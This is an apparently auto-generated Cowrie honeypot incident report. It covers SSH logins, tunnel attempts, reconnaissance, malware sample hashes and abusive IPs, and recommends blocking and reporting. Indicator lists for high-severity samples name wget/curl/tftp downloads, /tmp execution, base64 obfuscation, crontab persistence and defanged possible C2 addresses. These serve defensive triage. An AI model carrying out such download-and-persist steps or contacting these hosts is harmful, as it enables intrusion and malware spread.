| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:21:34` | `cowrie.session.connect` |
| `2026-07-13 22:21:34` | `cowrie.client.version` |
| `2026-07-13 22:21:34` | `cowrie.client.kex` |
| `2026-07-13 22:21:34` | `cowrie.login.success` |
| `2026-07-13 22:21:35` | `cowrie.session.params` |
| `2026-07-13 22:21:35` | `cowrie.command.input` |
| `2026-07-13 22:21:35` | `cowrie.command.failed` |
| `2026-07-13 22:21:35` | `cowrie.log.closed` |
| `2026-07-13 22:21:36` | `cowrie.session.params` |
| `2026-07-13 22:21:36` | `cowrie.command.input` |
| `2026-07-13 22:21:36` | `cowrie.session.file_download` |
| `2026-07-13 22:21:36` | `cowrie.log.closed` |
| `2026-07-13 22:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.146.59[.]77` to AbuseIPDB if not already reported
- [ ] Block `189.146.59[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d0be377e5b5

| Field | Detail |
|---|---|
| **Source IP** | `189.146.59[.]77` |
| **First Seen** | 2026-07-13 22:21 |
| **Last Seen** | 2026-07-13 22:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:21:36` | `cowrie.session.connect` |
| `2026-07-13 22:21:36` | `cowrie.client.version` |
| `2026-07-13 22:21:36` | `cowrie.client.kex` |
| `2026-07-13 22:21:37` | `cowrie.login.success` |
| `2026-07-13 22:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.146.59[.]77` to AbuseIPDB if not already reported
- [ ] Block `189.146.59[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2767d98727b5

| Field | Detail |
|---|---|
| **Source IP** | `189.146.59[.]77` |
| **First Seen** | 2026-07-13 22:21 |
| **Last Seen** | 2026-07-13 22:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:21:37` | `cowrie.session.connect` |
| `2026-07-13 22:21:37` | `cowrie.client.version` |
| `2026-07-13 22:21:37` | `cowrie.client.kex` |
| `2026-07-13 22:21:37` | `cowrie.login.success` |
| `2026-07-13 22:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.146.59[.]77` to AbuseIPDB if not already reported
- [ ] Block `189.146.59[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05d4faa8edc4

| Field | Detail |
|---|---|
| **Source IP** | `122.170.100[.]253` |
| **First Seen** | 2026-07-13 22:21 |
| **Last Seen** | 2026-07-13 22:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:21:49` | `cowrie.session.connect` |
| `2026-07-13 22:21:50` | `cowrie.client.version` |
| `2026-07-13 22:21:50` | `cowrie.client.kex` |
| `2026-07-13 22:21:51` | `cowrie.login.success` |
| `2026-07-13 22:21:52` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:21:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.100[.]253` to AbuseIPDB if not already reported
- [ ] Block `122.170.100[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-504f28bad1a0

| Field | Detail |
|---|---|
| **Source IP** | `45.181.101[.]95` |
| **First Seen** | 2026-07-13 22:21 |
| **Last Seen** | 2026-07-13 22:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:21:58` | `cowrie.session.connect` |
| `2026-07-13 22:21:59` | `cowrie.client.version` |
| `2026-07-13 22:21:59` | `cowrie.client.kex` |
| `2026-07-13 22:22:01` | `cowrie.login.success` |
| `2026-07-13 22:22:02` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.181.101[.]95` to AbuseIPDB if not already reported
- [ ] Block `45.181.101[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b824e75c35fa

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 22:36 |
| **Last Seen** | 2026-07-13 22:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:36:21` | `cowrie.session.connect` |
| `2026-07-13 22:36:21` | `cowrie.client.version` |
| `2026-07-13 22:36:21` | `cowrie.client.kex` |
| `2026-07-13 22:36:23` | `cowrie.login.success` |
| `2026-07-13 22:36:24` | `cowrie.session.params` |
| `2026-07-13 22:36:24` | `cowrie.command.input` |
| `2026-07-13 22:36:24` | `cowrie.log.closed` |
| `2026-07-13 22:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da6d2c749fd

| Field | Detail |
|---|---|
| **Source IP** | `117.2.123[.]19` |
| **First Seen** | 2026-07-13 22:40 |
| **Last Seen** | 2026-07-13 22:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:40:10` | `cowrie.session.connect` |
| `2026-07-13 22:40:11` | `cowrie.client.version` |
| `2026-07-13 22:40:11` | `cowrie.client.kex` |
| `2026-07-13 22:40:14` | `cowrie.login.success` |
| `2026-07-13 22:40:15` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:40:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.2.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `117.2.123[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84db07d47937

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]119` |
| **First Seen** | 2026-07-13 22:40 |
| **Last Seen** | 2026-07-13 22:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:40:44` | `cowrie.session.connect` |
| `2026-07-13 22:40:44` | `cowrie.client.version` |
| `2026-07-13 22:40:44` | `cowrie.client.kex` |
| `2026-07-13 22:40:47` | `cowrie.login.success` |
| `2026-07-13 22:40:47` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75524c0444c1

| Field | Detail |
|---|---|
| **Source IP** | `196.28.226[.]124` |
| **First Seen** | 2026-07-13 22:43 |
| **Last Seen** | 2026-07-13 22:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:43:48` | `cowrie.session.connect` |
| `2026-07-13 22:43:48` | `cowrie.client.version` |
| `2026-07-13 22:43:48` | `cowrie.client.kex` |
| `2026-07-13 22:43:51` | `cowrie.login.success` |
| `2026-07-13 22:43:52` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.28.226[.]124` to AbuseIPDB if not already reported
- [ ] Block `196.28.226[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aff8932f728

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-07-13 22:43 |
| **Last Seen** | 2026-07-13 22:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:43:57` | `cowrie.session.connect` |
| `2026-07-13 22:43:57` | `cowrie.client.version` |
| `2026-07-13 22:43:57` | `cowrie.client.kex` |
| `2026-07-13 22:43:59` | `cowrie.login.success` |
| `2026-07-13 22:44:00` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ce41fc030eb

| Field | Detail |
|---|---|
| **Source IP** | `206.0.8[.]204` |
| **First Seen** | 2026-07-13 22:44 |
| **Last Seen** | 2026-07-13 22:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:44:30` | `cowrie.session.connect` |
| `2026-07-13 22:44:31` | `cowrie.client.version` |
| `2026-07-13 22:44:31` | `cowrie.client.kex` |
| `2026-07-13 22:44:33` | `cowrie.login.success` |
| `2026-07-13 22:44:34` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.0.8[.]204` to AbuseIPDB if not already reported
- [ ] Block `206.0.8[.]204` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a147defe57e

| Field | Detail |
|---|---|
| **Source IP** | `85.195.9[.]20` |
| **First Seen** | 2026-07-13 22:48 |
| **Last Seen** | 2026-07-13 22:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 22:48:11` | `cowrie.session.connect` |
| `2026-07-13 22:48:11` | `cowrie.client.version` |
| `2026-07-13 22:48:11` | `cowrie.client.kex` |
| `2026-07-13 22:48:13` | `cowrie.login.success` |
| `2026-07-13 22:48:13` | `cowrie.direct-tcpip.request` |
| `2026-07-13 22:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.195.9[.]20` to AbuseIPDB if not already reported
- [ ] Block `85.195.9[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **17** | 2026-07-13 21:07 | 2026-07-13 22:48 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `103.213.95[.]198` | **5** | 2026-07-13 21:10 | 2026-07-13 22:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-13 21:00 | 2026-07-13 22:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]142` | **5** | 2026-07-13 21:55 | 2026-07-13 21:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.76.202[.]69` | **3** | 2026-07-13 20:56 | 2026-07-13 21:03 | 6m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]54` | **3** | 2026-07-13 21:55 | 2026-07-13 21:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]96` | **3** | 2026-07-13 21:56 | 2026-07-13 21:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.202.122[.]207` | **2** | 2026-07-13 22:11 | 2026-07-13 22:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.106[.]155` | **2** | 2026-07-13 21:22 | 2026-07-13 21:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.119.29[.]137` | **2** | 2026-07-13 21:49 | 2026-07-13 21:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `61.178.209[.]47` | **2** | 2026-07-13 21:01 | 2026-07-13 21:03 | 2m | 0 | `T1592` | 🟢 LOW |
| `219.89.197[.]82` | 1 | 2026-07-13 21:48 | 2026-07-13 21:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-07-13 22:02 | 2026-07-13 22:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-07-13 21:51 | 2026-07-13 21:52 | 101s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-13 22:37 | 2026-07-13 22:38 | 42s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]35` | 1 | 2026-07-13 22:39 | 2026-07-13 22:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `79.141.5[.]155` | 1 | 2026-07-13 22:30 | 2026-07-13 22:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-07-13 22:44 | 2026-07-13 22:46 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `111.70.23[.]236` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `206.0.8[.]204` | BR | BRSULNET TELECOM LTDA | **100** ⚠️ | 25 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 47 |
| `66.132.172[.]142` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `121.202.206[.]119` | HK | SmarTone Mobile Communications Ltd | **100** ⚠️ | 50 |
| `103.213.95[.]198` | CN | Beijing WangJu Interworking Information Technology Co. LTD | **100** ⚠️ | 6 |
| `66.132.195[.]96` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `45.181.101[.]95` | BR | PLUGAR TELECOM | **100** ⚠️ | 12 |
| `180.76.202[.]69` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 71 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 54 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 2 |
